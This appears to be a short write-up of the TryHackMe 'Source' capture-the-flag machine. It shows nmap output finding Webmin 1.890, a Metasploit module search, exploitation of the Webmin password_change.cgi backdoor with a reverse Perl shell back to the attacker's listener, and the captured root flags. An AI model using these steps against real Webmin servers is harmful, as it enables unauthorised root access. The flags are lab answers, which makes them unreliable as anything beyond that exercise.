@@ -1,0 +1,86 @@
+Today we have another boot2root machine listed easy on tryhackme named source.
+
+
+Main IP :: 
+
+Performing all port scan with nmap
+
+Nmap scan report for 10.49.164.149
+Host is up (0.00018s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+10000/tcp open  snet-sensor-mgmt
+
+
+Performing service and version detection scan.
+
+Nmap scan report for 10.49.164.149
+Host is up, received reset ttl 64 (0.00030s latency).
+Scanned at 2026-06-03 04:47:45 BST for 36s
+
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbZAxRhWUij6g6MP11OkGSk7vYHRNyQcTIdMmjj1kSvDhyuXS9QbM5t2qe3UMblyLaObwKJDN++KWfzl1+beOrq3sXkTA4Wot1RyYo0hPdQT0GWBTs63dll2+c4yv3nDiYAwtSsPLCeynPEmSUGDjkVnP12gxXe/qCsM2+rZ9tzXtSWiXgWvaxMZiHaQpT1KaY0z6ebzBTI8siU0t+6SMK7rNv1CsUNpGeicfbC5ZOE4/Nbc8cxNl7gDtZbyjdh9S7KTvzkSj2zBJ+8VbzsuZk1yy8uyLDgmuBQ6LzbYUNHkTQhJetVq7utFpRqLdpSJTcsz5PAxd1Upe9DqoYURuL
+|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYCha8jk+VzcJRRwV41rl8EuJBiy7Cf8xg6tX41bZv0huZdCcCTCq9dLJlzO2V9s+sMp92TpzR5j8NAAuJt0DA=
+|   256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJnY5oycmgw6ND6Mw4y0YQWZiHoKhePo4bylKKCP0E5
+10000/tcp open  http    syn-ack ttl 64 MiniServ 1.890 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 7C35A5A2C2E6095B6EE1CD16E78729FC
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+So normally a webmin server when we visit the port 10000 we see error for http so we tried with https and we have the login page infront of we will try to fuzz the directories and files more and see what we get.
+
+But nothing also in my case i even block and close my port 10000 
+
+So i start to search for webmin 1.890 on metasploit and edb and we have one on msfconsole.
+
+msf > search webmin
+                                                                   
+Matching Modules                                                   
+================                                                   
+                                                                   
+   #   Name                                           Disclosure Date  Rank       Check  Description
+   -   ----                                           ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
+   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
+   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
+   4     \_ target: Unix In-Memory                    .                .          .      .
+   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
+   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
+   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
+   12    \_ target: Automatic (Linux Dropper)         .
+   
+
+ exploit 
+[*] Started reverse TCP handler on 192.168.145.49:4444 
+[!] AutoCheck is disabled, proceeding with exploitation
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (192.168.145.49:4444 -> 10.49.140.129:60652) at 2026-06-03 04:10:15 +0000
+
+just set RHOST, LHOST and make SSL->true and the exploit.
+
+type shell for stable shell
+
+root@source:/home/dark# cat user.txt
+cat user.txt
+THM{SUPPLY_CHAIN_COMPROMISE}
+
+root@source:/home/dark# cat /root/root.txt
+cat /root/root.txt
+THM{UPDATE_YOUR_INSTALL}
+root@source:/home/dark# 
+
+This is simple and normal we directly had root user perms so tried above and got
